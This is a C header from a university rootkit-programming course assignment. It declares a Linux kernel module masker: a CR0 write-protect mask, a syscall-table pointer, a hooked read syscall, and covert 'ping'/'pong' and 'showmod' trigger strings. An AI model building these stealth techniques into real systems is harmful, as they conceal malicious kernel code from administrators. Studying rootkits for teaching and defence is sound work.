
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 5                                                             */
/*                                                                             */
/*   Filename: module_masker.h                                                 */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage:                                                                    */
/*                                                                             */
/*******************************************************************************/

#ifndef __MODULE_MASKER__
#define __MODULE_MASKER__


#define CR0_WRITE_PROTECT_MASK (1 << 16)
#define HEARTBEAT "ping"
#define HEARTBEAT_RESPONSE "pong"
#define VOILA "showmod"


void **sys_call_table;
asmlinkage long (*read_syscall)(unsigned int, char __user *, size_t);
int heartbeat_matched_so_far;   /* Characters of HEARTBEAT matched so far */
int voila_matched_so_far;   /* Characters of VOILA matched so far */

void disable_write_protect_mode(void);
void enable_write_protect_mode(void);
int match_command(char *, char *, int *);

#endif

